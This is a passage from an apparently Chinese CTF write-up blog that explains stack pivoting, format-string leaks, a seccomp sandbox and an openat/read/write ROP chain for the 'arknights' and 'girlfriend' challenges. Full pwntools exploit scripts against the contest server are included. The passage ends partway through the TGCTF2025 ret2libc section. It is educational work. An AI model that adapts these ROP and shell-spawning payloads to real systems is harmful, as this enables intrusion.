)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          employ(v4);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402D0C);</span><br><span class="line">          getchar();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(&amp;byte_402CFF);</span><br><span class="line">        getchar();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402D23);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    &amp;byte_402D38,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)ch_n,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)dword_405BE4,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)dword_405BE8,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)dword_405BEC);</span><br><span class="line">  __isoc99_scanf(&amp;unk_402CE3, &amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402DC6);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x60u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402DDF);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, byte_402DEF);</span><br><span class="line">  v8 = <span class="number">50015</span>;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402E02);</span><br><span class="line">  system(<span class="string">&quot;echo bye~&quot;</span>);</span><br><span class="line">  v7 = <span class="string">&quot;null&quot;</span>;</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码的漏洞点在于最后的“向好友炫耀”（潜意思是晒欧不得好死吗）时输入名字时存在溢出，题目也有system函数<br>所以最后关键在于传入&#x2F;bin&#x2F;sh<br>我们看调用read函数时的汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, 60h ; &#x27;`&#x27;  ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure><p>发现读入数据的存放地址是rbp+s，这里s是-0x40，于是我们便可以在第一次read时候先填充垃圾数据直到rbp，然后覆盖rbp为target+0x40，这里target就是我们伪造的栈段的地址(函数返回前都会执行一次leave;ret，这时rbp的值也就变为了我们填充的target+0x40，后文有解释)<br>接着填充返回地址为调用read的地址以便第二次溢出<br>在第二次溢出时我们在target写入’&#x2F;bin&#x2F;sh\x00’，然后控制rdi指向这个target地址，也就指向了&#x2F;bin&#x2F;sh，然后接着写sys地址<br>接着继续填充到ebp，覆盖ebp为target，在返回地址填上leave_ret指令的地址，也就完成了<strong>栈迁移</strong><br><strong>leave_ret指令其实就是</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">pop rip</span><br></pre></td></tr></table></figure><p>其实最初我有疑惑在于我们修改了read的读入地址，第二次读入的数据便不在栈上了，后续填充ebp和返回地址以栈迁移是如何完成的呢？<br>后来我想到，<strong>在调用一个函数前，程序会先同步rsp和rbp，开辟新的栈帧，也就是执行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br></pre></td></tr></table></figure><p>在第一次调用结束后，return前会先leave ret一次，这时候rsp指向了rbp，也就是我们覆盖的target+0x40，接着pop rbp，rbp到了target+0x40处，再pop rip，执行我们填充的call_read，调用read函数时，先push rbp，也就是target+0x40入栈，再mov rbp，rsp，这时候rsp指向target+0x40，那么rbp也指向target+0x40，这时候我们发现rsp和rbp都指向target+0x40，接着rsp根据read函数的需求向低地址扩张，然后读入我们输入的数据。这时候我们发现我们已经在target附近伪造了一个栈<br>这时候我们再覆盖rbp为target，覆盖返回地址为leave_ret指令，函数返回时便会leave_ret两次，然后pop进rip的便是target+8处的指令了。也就实现了栈迁移劫持程序执行流<br><br>wp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20551</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./arknights&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x4018e5</span></span><br><span class="line">leave_ret=<span class="number">0x401393</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">bss_add=<span class="number">0x405b00</span></span><br><span class="line">call_read=<span class="number">0x4018a8</span></span><br><span class="line">sys_plt=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">r.recvuntil(<span class="string">&quot;欢迎使用明日方舟寻访模拟器！祝你好运~\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;请选择：[1]单抽 [2]十连 [3]自定义数量 [4]结束抽卡\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;请选择：[1]向好友炫耀 [2]退出\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;请输入你的名字：&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss_add+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">fake_stack=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(pop_rdi)+p64(bss_add)+p64(ret)+p64(sys_plt)</span><br><span class="line">fake_stack=fake_stack.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2=fake_stack+p64(bss_add)+p64(leave_ret)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><h3 id="复现-ret2libc-orw-ROP"><a href="#复现-ret2libc-orw-ROP" class="headerlink" title="复现&#x2F;ret2libc&#x2F;orw&#x2F;ROP"></a>复现&#x2F;ret2libc&#x2F;orw&#x2F;ROP</h3><p>源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_1309(a1, a2, a3);</span><br><span class="line">  sub_1372();</span><br><span class="line">  sub_14F6();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1519();</span><br><span class="line">    <span class="keyword">switch</span> ( sub_157C(v5) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_15C9();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_1678();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sub_1708();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sub_179B();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;BabyShark will be very sad.....&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no no no....&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1519</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you some options:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. GirlFriend!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. BuyFlowers&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Reply&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. SingSongs&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. I don&#x27;t care&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Choice:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有用的选项源码如下<br><br>选项1<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_15C9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_4094 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have already tried to talk to her, and she left...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    dword_4094 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Girl is very beautiful!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;what do you want to say to her?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You say: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;but she left.........&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项2<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1678</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to buy her flowers?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Y/N&quot;</span>);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">89</span> || v1 == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_4090 &lt;= <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you don&#x27;t have enough money&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You did it!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;echo /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;what a pity!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项3<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1708</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4098 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++dword_4098;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should tell her your name first&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, byte_4060, <span class="number">0x100u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_4060);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You also get her name: XM&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can only introduce yourself twice.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到第二个选项，一看可以直接echo &#x2F;flag，还有这种好事？马上通过选项3修改dword_4090的值大于200，然后发现输出了You did it!\n却没有flag<br>接着发现程序开启了沙箱（悲），禁用了系统调用和open函数并且使⽤read函数的时候第⼀次参数只允许为0，所以这⾥我们需要close(0)之后再调⽤openat打开flag⽂件进⾏读取，否则⽆法使⽤read读取，具体如下所示<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwnpwn/xyctf_girlfriend</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x0c 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0014</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x09 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0014</span><br><span class="line"> 0005: 0x15 0x08 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0014</span><br><span class="line"> 0006: 0x15 0x07 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0014</span><br><span class="line"> 0007: 0x15 0x06 0x00 0x00000142  <span class="keyword">if</span> (A == execveat) goto 0014</span><br><span class="line"> 0008: 0x15 0x00 0x04 0x00000000  <span class="keyword">if</span> (A != <span class="built_in">read</span>) goto 0013</span><br><span class="line"> 0009: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 <span class="comment"># read(fd, buf, count)</span></span><br><span class="line"> 0010: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0014</span><br><span class="line"> 0011: 0x20 0x00 0x00 0x00000010  A = fd <span class="comment"># read(fd, buf, count)</span></span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p><strong>open函数可以用openat代替</strong>，于是进行orw<br>程序开启了canary保护和PIE保护，选项三有格式化字符串漏洞，可以利用来泄露canary，libc地址和程序基地址<br>选项1的溢出长度并不足以进行orw，于是我们把rop链用选项三写入，然后利用选项一栈迁移过去即可<br>需要注意的是，迁移过去的前56字节不要写rop链，不然会执行失败（还不知道为啥）<br><br>wp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20331</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./xyctf_girlfriend&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">talk</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;what do you want to say to her?&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">myname</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;You should tell her your name first\n&#x27;</span>,myname)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;%15$p%17$p%7$p&#x27;</span></span><br><span class="line">payload1=payload1.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">name(payload1)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak_add=<span class="built_in">int</span>(r.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">elfbase=<span class="built_in">int</span>(r.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x18d9</span></span><br><span class="line">libcbase=leak_add+<span class="number">48</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">pop_rdi=libcbase+<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi=libcbase+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12=libcbase+<span class="number">0x11f2e7</span></span><br><span class="line">pop_rax=libcbase+<span class="number">0x45eb0</span></span><br><span class="line">leave_ret=libcbase+<span class="number">0x4da83</span></span><br><span class="line">open_add=libcbase+libc.sym[<span class="string">&#x27;openat&#x27;</span>]</span><br><span class="line">read_add=libcbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_add=libcbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_add=libcbase+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">name_add=elfbase+<span class="number">0x4060</span></span><br><span class="line">ropchain=<span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(close_add)+p64(pop_rdi)+p8(<span class="number">156</span>)+p8(<span class="number">255</span>)*<span class="number">7</span>+p64(pop_rsi)+p64(name_add)+p64(pop_rdx_r12)</span><br><span class="line">ropchain+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(open_add)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_add)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">ropchain+=p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(write_add)</span><br><span class="line">ropchain=ropchain.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">name(ropchain)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)+p64(name_add+<span class="number">48</span>)+p64(leave_ret)</span><br><span class="line">talk(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ROP </category>
          
          <category> ret2libc </category>
          
          <category> 栈迁移 </category>
          
          <category> orw </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TGCTF2025</title>
      <link href="/2025/05/02/TGCTF2025/"/>
      <url>/2025/05/02/TGCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>简单的ret2libc,源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;As a student who has been learning pwn for half a year\n&quot;</span></span><br><span class="line">    <span class="string">&quot;basic ROP is an essential skill that everyone should master. \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Therefore, hurry up and complete the check-in. \n&quot;</span></span><br><span class="line">    <span 